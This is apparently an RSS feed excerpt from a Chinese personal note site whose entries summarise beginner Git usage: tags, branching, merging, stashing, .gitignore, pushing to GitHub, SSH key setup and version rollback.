      <description>git tag 用于查看本地仓库的所有标签。tag 是 git 版本库的一个标记，指向某个 commit 提交的指针，它比commit id方便我们记忆。
git tag TagName 给当前分支上的HEAD打上名为TagName的标签。
git tag TagName CommitId 给 commit id 为CommitId的提交打上名为TagName的标签。
git tag -a TagName -m &amp;ldquo;Instruction&amp;rdquo; CommitId 给 commit id 为CommitId的提交打上名为TagName的标签，并添加说明文字Instruction。
git tag -d TagName 删除名为TagName的本地标签。</description>
    </item>
    
    <item>
      <title>Git 与 Github</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/git-%E4%B8%8E-github/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/git-%E4%B8%8E-github/</guid>
      <description>Git 与 Github Git Git 是一款免费、开源、并且是目前世界上最先进的分布式版本控制系统。
它是 Linus 花了两周时间自己用 C 写了一个分布式版本控制系统，这就是 Git！一个月之内，Linux 系统的源码已经由 Git 管理了！何为大佬？
Git 迅速成为最流行的分布式版本控制系统，尤其是 2008 年，GitHub 网站上线了，Github 是一个 Git 做版本控制的代码托管平台，Github 为开源项目免费提供 Git 存储，无数开源项目开始迁移至 GitHub，包括 jQuery，PHP，Ruby 等等。
历史就是这么偶然，如果不是当年 BitMover 公司威胁 Linux 社区，可能现在我们就没有免费而超级好用的 Git 了。</description>
    </item>
    
    <item>
      <title>Git 临时分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E4%B8%B4%E6%97%B6%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E4%B8%B4%E6%97%B6%E5%88%86%E6%94%AF/</guid>
      <description>临时分支 在开发过程中，Bug 就像家常便饭一样，在 Git 中，当你接到一个修复一个代号 19 的 bug 的任务时，或者接到了一个新任务，开发代号为 R 的新功能时，但现在手头上的工作进度还没有完成，这时候该怎么办呢？
这种时候我们通常可以创建一个临时的分支，在这个临时的分支上进行修复 bug 或开发新功能，最后在将这个分支合并到主分支。
暂存当前的工作进度 git stash 我们当前处于dev分支上，在这个分支上暂存工作进度
创建临时分支 git checkout -b bug18 创建一个临时分支，然后我们在这个分支上修复 bug 或开发新功能，完成后进行commit。
合并到主分支 git switch mastergit merge --no-ff -m &amp;#34;merged bug fix 101&amp;#34; issue-101 切换回主分支master，再将临时分支合并到主分支，合并完成后你可以删除临时分支。
恢复工作进度 git switch dev git stash pop 切换到 dev 分支，通常用git stash pop命令之前的恢复工作进度。
另一种恢复 git cherry-pick 4c805e2 也可以使用git cherry-pick命令恢复到指定的commitHash提交到当前分支，这样就可以避免多余的操作了。</description>
    </item>
    
    <item>
      <title>Git 什么是分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E4%BB%80%E4%B9%88%E6%98%AF%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E4%BB%80%E4%B9%88%E6%98%AF%E5%88%86%E6%94%AF/</guid>
      <description>什么是分支 分支就是科幻电影里面的平行宇宙，当你正在电脑前努力学习 Git 的时候，另一个你正在另一个平行宇宙里努力学习 SVN。
当两个平行宇宙互不干扰时，那对现在的你也没啥影响。不过，在某个时间点，两个平行宇宙合并了，结果，你既学会了 Git 又学会了 SVN！
分支有什么用 假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了 50% 的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人无法干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。
现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</description>
    </item>
    
    <item>
      <title>Git 什么是版本控制系统</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E4%BB%80%E4%B9%88%E6%98%AF%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E4%BB%80%E4%B9%88%E6%98%AF%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F/</guid>
      <description>什么是版本控制系统 所有的版本控制系统，其实 只能跟踪文本文件的改动，比如 TXT 文件，HTML，所有的程序代码文档等等，Git 也不例外。版本控制系统可以告诉你每次的改动，比如在第 5 行加了一个单词 Linux ，在第 8 行删了一个单词 Windows 。
而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件内容（二进制编码）的变化，只能把二进制文件每次改动串起来，也就是只知道图片从 100KB 改成了 120KB，但具体改了啥，在文件的哪里作了修改，版本控制系统并不知道，也没法知道。这里值得注意的是，Microsoft 的 Word 格式是二进制格式，因此，版本控制系统是没法跟踪 Word 文件的改动的。
因此，我这里比较推荐使用 markdown 作为文本编辑的格式，以及我个人比较喜欢使用 Typora 编辑 markdown 文件，之后再用 Vs code + git，推送到 GitHub 上，非常的方便。</description>
    </item>
    
    <item>
      <title>Git 克隆远程库</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%85%8B%E9%9A%86%E8%BF%9C%E7%A8%8B%E5%BA%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%85%8B%E9%9A%86%E8%BF%9C%E7%A8%8B%E5%BA%93/</guid>
      <description>克隆远程库 通常，当我们在 Github 上创建了一个远程库时，有时候需要多个人协作共同修改这个远程库，这时候我们就可以在多台设备上克隆这个远程库，并将它放到本地
克隆远程库 接下来我们使用git clone RemoteAddress命令将我们刚刚创建的远程库克隆到本地。
git clone git@github.com:YxzRainy/YxzRainy.github.io.git GitHub 给出的克隆地址不止一个，还可以用https://github.com/michaelliao/gitskills.git这样的地址。实际上，Git 支持多种协议，默认的git://使用 ssh，但也可以使用https等其他协议。
使用https除了速度慢以外，还有个最大的麻烦是每次推送都必须输入口令，但是在某些只开放 http 端口的公司内部就无法使用ssh协议而只能用https。</description>
    </item>
    
    <item>
      <title>Git 分支是如何工作的</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%88%86%E6%94%AF%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%88%86%E6%94%AF%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84/</guid>
      <description>分支是如何工作的 主分支 在 Git 里，有一个默认的主分支，即master。HEAO严格来说并不是指向当前版本，而是指向的master，master才是指向当前版本的。所以，HEAD指向的就是当前分支，而当前分支的指针就是指向的当前版本。
commit 后分支的变化 每次提交，master都会向前进一个版本，这样，随着你不断提交，master的线也越来越长。
当我们新建一个dev分支，指向与master相同的提交，再把HEAD指向dev，就表示我们当前在dev上工作。
新增分支 从现在开始，对工作区的修改和提交就是在dev分支上了，比如再一次提交后，dev分支就往前进一个版本，而master分支不变。
合并分支 现在，我们在dev上的工作完成了，可以把dev合并到master上，直接把master指向dev的当前版本，就完成了合并。
删除分支 合并分支后，你可以删掉dev分支，删掉后，我们就只剩下master分支。</description>
    </item>
    
    <item>
      <title>Git 分支管理策略</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E7%AD%96%E7%95%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E7%AD%96%E7%95%A5/</guid>
      <description>分支管理策略 在实际开发中，我们应该按照几个基本原则进行分支管理：
首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；
那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；
你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。
所以，团队合作的分支看起来就像这样：</description>
    </item>
    
    <item>
      <title>Git 创建并合并分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E5%B9%B6%E5%90%88%E5%B9%B6%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E5%B9%B6%E5%90%88%E5%B9%B6%E5%88%86%E6%94%AF/</guid>
      <description>创建并合并分支 创建文件 目前我们处于 Git 给我们创建的默认 maser 分支下，我们需要在这个分支下进行一些工作。
我们先创建一个文件 ReadMe.txt 来作为我们的本次的工作文件。
提交文件 我们需要在maser分支上进行一次提交，以确保我们在默认分支下是进行过提交的。
git add ReadMe.txt git commit -m &amp;#34;这是第二个分支&amp;#34; 创建分支 接下来创建另一个dev分支。
git branch dev 切换分支 切换到刚才新建的dev分支。
 git checkout dev 修改文件并提交 我们在新创建的dev分支上工作，修改 ReadMe.txt，在文件中加上文本内容：“这是第二个分支”。
git add ReadMe.txt git commit -m &amp;#34;这是第二个分支&amp;#34; 再次切换分支 现在我们已经再dev分支上完成了工作，现在我们需要切换辉原分支master
git checkout master 重新查看文件 这时候会发现在master分支上，ReadMe.txt 文件中并没有文本：“这是第二个分支”。
合并分支 Fast Forward 模式合并分支 现在，我们将刚刚在dev分支上的工作成果（文件中加上文本内容：“这是第二个分支”。）合并到master分支上。
git merge dev 再查看 readme.txt 的内容，就可以看到，当前maser分支上的内容和dev分支的最新提交是完全一样的。
no Fast Forward 模式合并分支 通常，合并分支时，Git 会用Fast forward模式，但这种模式下，删除分支后，会丢掉分支信息。
如果要强制禁用Fast forward模式，Git 就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。
git merge --no-ff -m &amp;#34;merge describe&amp;#34; dev 删除分支 合并完成后，就可以放心地删除dev分支了</description>
    </item>
    
    <item>
      <title>Git 创建标签</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E6%A0%87%E7%AD%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E6%A0%87%E7%AD%BE/</guid>
      <description>创建标签 切换到需要打标签的分支上
git checkout master 使用命令git tag &amp;lt;name&amp;gt;就可以打一个新标签：
git tag v1.0 可以用命令git tag查看所有标签
git tag 忘记打标签 有时候，如果忘了打标签，比如，现在已经是周五了，但应该在周一打的标签没有打，怎么办？
方法是找到历史提交的commit id，然后打上对应标签就可以了。
git log --pretty=oneline --abbrev-commitgit tag v2.0 c0e9bf4 创建带说明的标签 git tag -a v0.1 -m &amp;#34;version 0.1 &amp;#34; 1094adb -a指定标签名，-m指定说明文字。
标签总是和某个commit id挂钩。如果这个commit id既出现在master分支，又出现在dev分支，那么在这两个分支上都可以看到这个标签。</description>
    </item>
    
    <item>
      <title>Git 创建版本库</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E7%89%88%E6%9C%AC%E5%BA%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E7%89%88%E6%9C%AC%E5%BA%93/</guid>
      <description>创建版本库 什么是版本库 版本库又名仓库（Repository），你可以简单理解成一个目录，这个目录里面的所有文件都可以被 Git 管理起来，每个文件的修改、删除，Git 都能跟踪，以便任何时刻都可以追踪历史，并且以后随时回退到某个历史版本。
初始化 Git 目录 我们创建一个文件夹 GitFolder（文件名随意），并进入到这个文件夹，然后在命令行输入git init命令将这个目录变成可以用 Git 来管理的仓库。
git init 当目录中出现一个 .git 文件夹，就说明你的 Git 仓库初始化完成了。
这个目录是 Git 来跟踪管理版本库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把 Git 仓库给破坏了。
如果你没有看到 .git 目录，那是因为这个目录默认是隐藏的，在当前文件夹输入ls -ah命令就可以看见，或者直接打开显示隐藏文件的选项。
把文件添加到版本库 现在我们编写一个 Readme.txt 文件，内容如下：
Git is a version control system. Git is free software. 一定要放到你刚才目录下创建的文件夹 GitFolder 中，子目录也行，因为这是一个 Git 仓库，放到其他地方 Git 再厉害也找不到这个文件。
把文件添加到暂存区 用命令git add告诉 Git，把文件添加到暂存区
git add readme.txt 执行上面的命令，没有任何显示，这就对了，Unix 的哲学是：没有消息就是好消息，说明文件已经成功添加到暂存区了。
提交暂存区的文件 接下来，我们用命令git commit告诉 Git，把文件提交到本地仓库
git commit -m &amp;#34;Description of this submission&amp;#34; 执行成功后，大概率会出现类似下面的提示</description>
    </item>
    
    <item>
      <title>Git 合并冲突</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%90%88%E5%B9%B6%E5%86%B2%E7%AA%81/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%90%88%E5%B9%B6%E5%86%B2%E7%AA%81/</guid>
      <description>合并冲突 有时候，我们在使用git merge命令进行合并的时候，会出现以下提示。
Auto-merging Rainy.txt CONFLICT (content): Merge conflict in Rainy.txt Automatic merge failed; fix conflicts and then commit the result. 会发现使用git merge自动合并失败了，git 提示我们需要手动 修复冲突，然后提交结果。
如何解决冲突 我们只需要把 Git 合并失败的文件手动编辑为我们希望的内容，再git commit即可。</description>
    </item>
    
    <item>
      <title>Git 工作区与暂存区</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%B7%A5%E4%BD%9C%E5%8C%BA%E4%B8%8E%E6%9A%82%E5%AD%98%E5%8C%BA/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%B7%A5%E4%BD%9C%E5%8C%BA%E4%B8%8E%E6%9A%82%E5%AD%98%E5%8C%BA/</guid>
      <description>工作区与暂存区 工作区 工作区就是你在电脑中看到的一个文件夹。它包括你实际更改的文件和当前修改但未使用git add存入暂存区的文件。
这个文件夹中有一个隐藏的目录**.git**，这个不算是工作区，它只是 Git 的版本库。
这个版本库 .git 里存了许多东西，其中最重要的就是我们的暂存区和一个 Git 自动为我们创建的第一个分支 master，以及指向这个master的一个指针HEAD。
暂存区 暂存区是一个名为 index 的文件，当我们使用git add命令添加文件的时候，实际上就是将我们的文件添加到暂存区。
接着再用git commit提交文件时，实际上就是吧暂存区里的所有文件提交到当前分支，默认这个分支为 master.
因此，当我们git commit时，就是将暂存区中的文件添加到 master 上。
你可以简单理解为，将需要提交的文件修改通通先放到暂存区，然后，再一次性提交暂存区的所有修改到分支上。
一旦提交后，如果你提交后又没有对工作区做任何修改，那么工作区就是“干净”的。
执行git status.
On branch master nothing to commit, working tree clean </description>
    </item>
    
    <item>
      <title>Git 忽略特殊文件</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%BF%BD%E7%95%A5%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%BF%BD%E7%95%A5%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6/</guid>
      <description>忽略特殊文件 在某些情况下，我们不想某些在工作区中的文件被提交，也就是不被git add .命令添加到暂存区，就非常有要将这些文件忽略掉（让 Git 对他们视而不见）。
我们可以在 Git 工作区的根目录下创建一个特殊的**.gitignore**文件，然后把要忽略的文件名填进去，Git 就会在git add的时候忽略这些文件。
.gitignore文件可以放到版本库里，这样可以对**.gitignore**做版本管理。
忽略文件的原则  忽略操作系统自动生成的文件，比如缩略图等； 忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如 Java 编译产生的.class文件； 忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。  编写 .gitignore 规则 # Windows: Thumbs.db ehthumbs.db Desktop.ini  # Python: *.py[cod] *.so *.egg *.egg-info dist build  # My configurations: db.ini deploy_key_rsa 编写完成后，最后就是把**.gitignore也提交到 Git，就完成了！当然检验.gitignore的标准是使用git status命令会不会提示working directory clean**。
无法添加文件 有些时候，你想添加一个文件到 Git，但发现添加不了，原因是这个文件被**.gitignore**忽略了：
git add Rainy.classThe following paths are ignored by one of your .gitignore files:Rainy.classUse -f if you really want to add them.</description>
    </item>
    
    <item>
      <title>Git 推送分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%8E%A8%E9%80%81%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%8E%A8%E9%80%81%E5%88%86%E6%94%AF/</guid>
      <description>推送分支 添加文件并提交 git add . git commit -m &amp;#34;提交信息&amp;#34; 拉取分支 git pull origin master 为什么要先拉取分支呢？是因为远程库的最新提交和你试图推送的本地库不同步所导致的，因此需要先用git pull把最新的提交从origin/master上拉取到本地即可。
分支名的问题 在使用git pull origin master命令将本地分支与远程分支同步，结果出现下面的报错信息：
fatal: couldn&amp;#39;t find remote ref master 大致意思就是找不到 master 这个远程分支。
解决 只需要到你的 GitHub 上，查看仓库的默认分支即可，比如我的是main，所以我只需要将命令修改为git pull origin main即可，最后在git pull origin master，就可以将本地分支的内容推送到远程分支master上了。
合并冲突 这时候使用git pull 后合并有冲突，我们只需要把 Git 合并失败的文件手动编辑为我们希望的内容就可以解决冲突，再git commit即可。
推送分支 git push origin master 将本地库master分支上的内容推送到远程库master上去，用git push命令。
推送成功后，可以立刻在 GitHub 页面中看到远程库的内容已经和本地的一模一样了。
推送失败 有时候，当我们在用git push origin master命令时，会出现以下错误信息，通常是因为远程库的最新提交和你试图推送的本地库不同步所导致的。
master master (fetch first)Updates were rejected because the remote contains work that you donot have locally.</description>
    </item>
    
    <item>
      <title>Git 撤销修改</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%92%A4%E9%94%80%E4%BF%AE%E6%94%B9/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%92%A4%E9%94%80%E4%BF%AE%E6%94%B9/</guid>
      <description>撤销修改 人哪有不犯错的，因此，当你修改了一个文件时，之后发现这次修改不太合理，想撤销这次修改的时候，怎么办呢？
这个时候，你可以直接使用git checkout -- FileName 来撤销 FileName 文件在工作区的全部修改。这个命令分为几种情况
文件未被添加到暂存区 对文件FileName进行修改后，但还没有将它添加到暂存区，我们这个时候使用git checkout -- FileName，FileName就会回到修改前的状态。
文件被添加到了暂存区 对文件FileName进行第一次修改后，并且将它添加到了暂存区（这个时候的状态为被添加到暂存区后），接着再次对FileName进行修改，我们这个时候使用git checkout -- FileName，FileName就会回到被添加到暂存区后的状态。
总之，git checkout -- FileName就是让文件 FileName 回到最近一次git commit或git add时的状态。</description>
    </item>
    
    <item>
      <title>Git 操作标签</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%93%8D%E4%BD%9C%E6%A0%87%E7%AD%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%93%8D%E4%BD%9C%E6%A0%87%E7%AD%BE/</guid>
      <description>操作标签 删除标签 git tag -d v0.1 因为创建的标签都只存储在本地，不会自动推送到远程。所以，打错的标签可以在本地安全删除。
如果标签已经推送到远程，要删除远程标签就麻烦一点，先从本地删除，然后，从远程删除。
git push origin :refs/tags/v0.9 要看看是否真的从远程库删除了标签，可以登陆 GitHub 查看。
推送标签 推送指定标签到远程库。
git push origin v1.0 推送全部尚未推送到远程的本地标签到远程库。
 git push origin --tags </description>
    </item>
    
    <item>
      <title>Git 标签管理</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86/</guid>
      <description>标签管理 发布一个版本时，我们通常先在版本库中打一个标签（tag），这样，就唯一确定了打标签时刻的版本。将来无论什么时候，取某个标签的版本，就是把那个打标签的时刻的历史版本取出来。所以，标签也是版本库的一个快照。
Git 的标签虽然是版本库的快照，但其实它就是指向某个 commit 的指针（跟分支很像对不对？但是分支可以移动，标签不能移动），所以，创建和删除标签都是瞬间完成的。
Git 有 commit，为什么还要引入 tag？ 请把上周一的那个版本打包发布，commit 号是 6a5819e&amp;hellip;
一串乱七八糟的数字不好找！
如果换一个办法：
请把上周一的那个版本打包发布，版本号是 v1.2
“好的，按照 tag v1.2 查找 commit 就行！”
所以，tag 就是一个让人容易记住的有意义的名字，它跟某个 commit 绑在一起。</description>
    </item>
    
    <item>
      <title>Git 添加第一个远程库</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%A6%96%E6%AC%A1%E6%B7%BB%E5%8A%A0%E8%BF%9C%E7%A8%8B%E5%BA%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%A6%96%E6%AC%A1%E6%B7%BB%E5%8A%A0%E8%BF%9C%E7%A8%8B%E5%BA%93/</guid>
      <description>添加第一个远程库 什么是远程仓库 当我们需要多个人协助开发时，必然会遇到一个问题，就是双方的信息如何进行传递同步。 这个时候，就需要搭建一个远程服务器，每个人都从这个远程服务器克隆一份到自己的电脑上，并且把自己需要提交推送到服务器仓库里，也可以从服务器仓库中拉取别人的提交。
创建远程库 注册一个 Github 账号 创建 Github Repository 在 Github 上创建一个仓库，仓库名随意， 。
关联远程库 我们使用git remote add origin命令把本地库与一个远程库关联起来。
git remote add origin git@github.com:YxzRainy/YxzRainy.github.io.git 远程库的名字就是origin，这是默认的名字，你也可以将它改成别的。
将 Git 与 Github 关联 下载并安装 Git 配置个人信息 git config --global user.name &amp;#34;Your UserName&amp;#34; git config --global user.email &amp;#34;YourEmail@qq.com&amp;#34; 生成 ssh 密钥文件 hexo d 到远程仓库，因为每一台电脑中的私钥只有只有一个，因此当你想给另一个 github 账号配置博客时，必须重新生成公钥和私钥
ssh-keygen -t rsa -C &amp;#34;1971438937@qq.com&amp;#34; 输入后，三个回车，默认不需要设置密码，之后到所显示的路径中找到生成的 ssh 的文件夹中的id_rsa.pub文件中的密钥，将其中内容全部复制。
new SSH Key 打开你的 Github 的主页，点击头像，选择 Settings，再选择 SSH and GPG keys，找到 SSH keys，点击 New SSH Key，Title 为标题，任意填写，将刚刚复制的 id_rsa pub 文件中的密钥文本粘贴进去，最后 Add SSH key。</description>
    </item>
    
    <item>
      <title>Git 添加第二个远程库</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%BF%9C%E7%A8%8B%E5%BA%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%BF%9C%E7%A8%8B%E5%BA%93/</guid>
      <description>添加第二个远程库 将 GitHub 上的远程库与一个本地库关联起来。
关联远程库 我们使用git remote add origin命令把本地库与一个远程库关联起来。
git remote add origin git@github.com:YxzRainy/YxzRainy.github.io.git # 远程库链接 添加文件并提交 git add . git commit -m &amp;#34;提交信息&amp;#34; 推送分支 git push origin master 将本地库master分支上的内容推送到远程库master上去.
推送成功后，可以立刻在我们的 GitHub 仓库种中看到远程库的内容已经和本地的一模一样了。</description>
    </item>
    
    <item>
      <title>Git 清空远程分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%B8%85%E7%A9%BA%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%B8%85%E7%A9%BA%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/</guid>
      <description>清空远程分支 将清空后的本地分支推送到远程分支，以达到清空远程分支的目的。
删除全部文件 打开本地仓库文件夹，删除不需要的文件，仅保留 .git 文件夹和 ReadMe.md 文件.
输入命令 git add . git commit -m &amp;#39;清空远程仓库&amp;#39; git push origin master </description>
    </item>
    
    <item>
      <title>Git 版本回退</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80/</guid>
      <description>版本回退 类似存档 现在我们新建一个文件text.txt，并对这个文件进行第一次修改和提交，得到text.txt 1.0 版本。
 重复以上步骤，对text.txt进行修改和提交，得到text.txt 2.0版本， 再次对text.txt进行修改和提交，得到text.txt 3.0版本。 目前为止，我们对这个文件修改并提交了三次，分别得到1.0、2.0、3.0三个版本。  不知道你有没有发现，修改一个文件后并提交与通过一关游戏并存档有着相似之处。
这就好比玩闯关游戏时，每通过一关，系统就会自动把游戏进度存档，如果某一关没过去，你还可以选择读取前一关的存档，有些时候，在打 Boss 之前，你会手动存档，以便万一打 Boss 失败了，可以从最近的地方重新开始。
Git 也是一样，每当你觉得文件修改到一定程度的时候，就可以保存一个快照，这个快照在 Git 中被称为commit。一旦你把文件改乱了，或者误删了文件，还可以从最近的一个commit恢复，然后继续工作，而不是把几个月的工作成果全部丢失。
在 Git 中，用HEAD表示当前版本，上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上 100 个版本写 100 个**^比较容易数不过来，所以我们写成HEAD~100或者HEAD~50**。
回退的上一个版本 再次回到我们的text.txt文件上，假设我们目前是版本 3.0，也就是最新版本，现在用git reset --hard HEAD^ 命令将文件退回到上一个版本。
git reset --hard HEAD^ OK，现在文件已经被还原到上一个版本 2.0了，当然，你还可以继续回退到上一个版本1.0，不过先别着急。
